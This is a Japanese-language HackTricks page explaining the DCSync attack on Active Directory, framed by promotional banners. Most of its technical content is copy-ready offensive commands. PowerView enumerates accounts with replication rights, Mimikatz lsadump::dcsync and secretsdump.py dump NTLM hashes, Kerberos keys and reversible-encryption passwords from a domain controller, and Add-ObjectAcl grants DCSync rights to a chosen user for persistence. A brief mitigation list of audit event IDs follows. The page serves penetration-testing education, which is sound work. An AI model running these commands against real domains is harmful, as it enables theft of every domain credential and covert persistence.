# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのスウェグ**](https://peass.creator-spring.com)を手に入れる
* 独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>

## DCSync

**DCSync**権限は、ドメイン自体に対してこれらの権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。

**DCSyncに関する重要事項:**

* **DCSync攻撃は、ドメインコントローラーの振る舞いをシミュレートし、他のドメインコントローラーに情報を複製するよう要求**します。これはディレクトリレプリケーションサービスリモートプロトコル（MS-DRSR）を使用します。MS-DRSRはActive Directoryの有効で必要な機能であるため、オフにしたり無効にしたりすることはできません。
* デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、およびDomain Controllers**グループのみが必要な特権を持っています。
* 逆転可能な暗号化でアカウントのパスワードが保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。

### 列挙

`powerview`を使用してこれらの権限を持っているユーザーをチェックします：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### ローカルでの悪用
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでの悪用
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc`は3つのファイルを生成します:

* **NTLMハッシュ**を含むファイル1つ
* **Kerberosキー**を含むファイル1つ
* NTDSから平文パスワードを含むファイル1つ。[**可逆暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効に設定されたアカウントのNTDSからユーザーを取得できます。

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持続性

ドメイン管理者であれば、`powerview`のヘルプを使用して、任意のユーザーにこの権限を付与できます。
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
その後、**ユーザーが正しく割り当てられているかどうかを確認**することができます（特権の名前は「ObjectType」フィールド内に表示されるはずです）:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 緩和策

* セキュリティイベントID 4662（オブジェクトの監査ポリシーを有効にする必要があります）- オブジェクトに操作が実行されました
* セキュリティイベントID 5136（オブジェクトの監査ポリシーを有効にする必要があります）- ディレクトリサービスオブジェクトが変更されました
* セキュリティイベントID 4670（オブジェクトの監査ポリシーを有効にする必要があります）- オブジェクトのアクセス許可が変更されました
* AD ACLスキャナー - ACLの作成と比較レポートを作成します。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考文献

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、**あなたのハッキングトリックを共有**してください。

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
